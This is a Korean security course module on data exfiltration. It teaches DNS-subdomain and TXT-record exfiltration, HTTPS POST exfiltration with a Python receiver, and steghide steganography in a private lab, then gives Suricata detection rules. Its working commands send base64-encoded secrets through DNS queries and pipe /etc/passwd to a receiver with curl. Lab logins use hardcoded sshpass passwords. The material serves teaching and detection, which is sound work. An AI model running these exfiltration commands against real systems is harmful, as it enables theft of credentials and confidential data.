# Week 05: 데이터 유출 — DNS Exfil, HTTPS Exfil, 스테가노그래피

## 학습 목표
- 데이터 유출(Exfiltration, TA0010) 전술의 주요 기법과 원리를 이해한다
- DNS 프로토콜을 이용한 데이터 유출 기법을 구현하고 탐지할 수 있다
- HTTPS 채널을 통한 은닉 데이터 유출 기법을 실습한다
- 스테가노그래피를 이용한 데이터 은닉 및 추출 기법을 익힌다
- 데이터 유출 방지(DLP) 전략을 수립할 수 있다

## 선수 지식
- 공방전 기초 과정 이수
- Week 03 C2 채널 구축 (DNS Tunneling 이해)
- 네트워크 프로토콜 분석 기초

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 유출 수신 서버 | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 네트워크 모니터링/DLP | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 감염 호스트 (유출 출발지) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 탐지 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | 데이터 유출 이론 | 강의 |
| 0:30-1:10 | DNS Exfiltration 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | HTTPS Exfiltration 실습 | 실습 |
| 2:00-2:40 | 스테가노그래피 실습 | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:30 | DLP 전략 토론 + 퀴즈 | 토론 |

---

# Part 1: 데이터 유출 이론 (30분)

## 1.1 Exfiltration 전술 개요

데이터 유출은 공격자가 목표 시스템에서 **수집한 데이터를 외부로 반출**하는 킬체인 최종 단계이다.

| 기법 ID | 기법 | 채널 | 은닉성 |
|---------|------|------|--------|
| T1048.001 | Exfil Over Symmetric Encrypted Non-C2 | 암호화 채널 | 상 |
| T1048.003 | Exfil Over Unencrypted Non-C2 | 평문 채널 | 하 |
| T1041 | Exfil Over C2 Channel | 기존 C2 | 중 |
| T1567 | Exfil Over Web Service | 클라우드 | 상 |
| T1537 | Transfer Data to Cloud Account | 클라우드 | 상 |
| T1029 | Scheduled Transfer | 시간 기반 | 중 |

## 1.2 유출 채널 비교

```
대역폭:  HTTPS > FTP > ICMP > DNS
은닉성:  DNS > ICMP > HTTPS > FTP
탐지 난이도: DNS > 스테가노 > HTTPS(TLS) > 평문
```

---

# Part 2: DNS Exfiltration 실습 (40분)

## 실습 2.1: DNS 쿼리를 이용한 파일 유출

> **목적**: DNS 프로토콜로 파일 데이터를 서브도메인에 인코딩하여 유출한다
> **배우는 것**: DNS exfil 구현, 패킷 분석

```bash
# 유출할 테스트 데이터 생성 (web)
echo "CONFIDENTIAL: server_password=S3cr3t_2026!" > /tmp/secret.txt

# Base64 인코딩 후 DNS 쿼리로 유출 (web → opsclaw)
cat /tmp/secret.txt | base64 -w 63 | while read line; do
  nslookup "${line}.exfil.lab.local" 10.20.30.201
  sleep 0.5
done

# 수신 서버 (opsclaw): DNS 쿼리 캡처
tcpdump -i eth0 -n port 53 -l | while read line; do
  echo "$line" | grep -oP '[A-Za-z0-9+/=]+(?=\.exfil)' | base64 -d 2>/dev/null
done
```

## 실습 2.2: DNS TXT 레코드 대량 유출

> **목적**: 더 큰 데이터를 TXT 레코드로 분할 유출한다
> **배우는 것**: 데이터 청크 분할, 재조립

```bash
# 파일을 63바이트 청크로 분할 유출
split -b 63 /tmp/secret.txt /tmp/chunk_
for f in /tmp/chunk_*; do
  data=$(base64 -w 0 "$f")
  dig @10.20.30.201 "${data}.seq$(basename $f).exfil.lab.local" TXT +short
done
```

---

# Part 3: HTTPS Exfiltration 실습 (40분)

## 실습 3.1: HTTPS POST를 통한 데이터 유출

> **목적**: 정상 HTTPS 트래픽에 데이터를 숨겨 유출한다
> **배우는 것**: TLS 암호화 채널 악용, 탐지 한계

```bash
# 수신 서버 (opsclaw): 간이 HTTPS 수신기
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        with open('/tmp/exfil_received.bin', 'ab') as f:
            f.write(data)
        print(f'[수신] {length} bytes')
        self.send_response(200)
        self.end_headers()

server = HTTPServer(('0.0.0.0', 8443), ExfilHandler)
print('HTTPS Exfil 수신 대기...')
server.serve_forever()
"

# 감염 호스트 (web): 파일 유출
tar czf - /etc/passwd /etc/hostname 2>/dev/null | \
  curl -X POST -H "Content-Type: application/octet-stream" \
  --data-binary @- http://10.20.30.201:8443/upload
```

---

# Part 4: 스테가노그래피 실습 (40분)

## 4.1 스테가노그래피란?

데이터를 **이미지, 오디오 등 일반 파일에 숨기는** 기법이다. 파일의 외형은 정상으로 보인다.

## 실습 4.1: 이미지에 데이터 숨기기

> **목적**: 이미지 파일에 비밀 데이터를 은닉한다
> **배우는 것**: steghide 사용, LSB 기법

```bash
# steghide로 이미지에 데이터 숨기기
steghide embed -cf cover.jpg -ef /tmp/secret.txt -p "passphrase"

# 추출
steghide extract -sf cover.jpg -p "passphrase"

# 분석: 원본과 비교
md5sum cover_original.jpg cover.jpg
file cover.jpg
strings cover.jpg | tail -5

# binwalk로 숨겨진 데이터 탐지
binwalk cover.jpg
binwalk -e cover.jpg
```

## 4.2 DLP 탐지 전략

```bash
# 네트워크 기반 DLP: 대용량 아웃바운드 탐지
# Suricata 규칙
cat >> /tmp/exfil_detect.rules << 'EOF'
alert http any any -> $EXTERNAL_NET any (msg:"Large Outbound POST"; flow:to_server; http.method; content:"POST"; http.content_len; content:">1000000"; sid:2000001; rev:1;)
alert dns any any -> any any (msg:"DNS Exfil - Long subdomain"; dns.query; pcre:"/^[a-zA-Z0-9+\/=]{40,}\./"; sid:2000002; rev:1;)
EOF
```

---

## 검증 체크리스트
- [ ] DNS exfiltration을 직접 구현하여 파일을 유출할 수 있다
- [ ] HTTPS POST를 통한 데이터 유출을 수행할 수 있다
- [ ] steghide를 이용한 스테가노그래피를 수행할 수 있다
- [ ] 각 유출 기법에 대한 탐지 규칙을 작성할 수 있다
- [ ] DLP 전략의 네트워크/호스트 레벨 대응을 설명할 수 있다

## 자가 점검 퀴즈
1. DNS Exfiltration에서 서브도메인 길이 제한(63자)이 존재하는 이유와 우회 방법은?
2. TLS 암호화된 HTTPS 유출을 탐지하기 위한 방법 3가지를 제시하시오.
3. 스테가노그래피와 암호화의 차이점을 보안 목표 관점에서 설명하시오.
4. T1029(Scheduled Transfer)를 사용하는 이유와 탐지 접근법은?
5. 조직에서 효과적인 DLP 전략을 수립하기 위해 필요한 요소 5가지를 나열하시오.
